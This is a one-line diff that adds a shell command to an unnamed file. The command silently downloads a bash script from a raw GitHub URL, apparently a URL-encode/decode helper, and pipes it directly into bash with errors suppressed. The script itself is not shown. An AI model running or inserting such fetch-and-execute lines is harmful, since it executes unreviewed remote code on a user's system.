@@ -1,0 +1,1 @@
+wget -qO- https://raw.githubusercontent.com/php-dev-9300/Bash/refs/heads/main/snippets/urlencode-decode/function-1.sh  2> /dev/null | bash
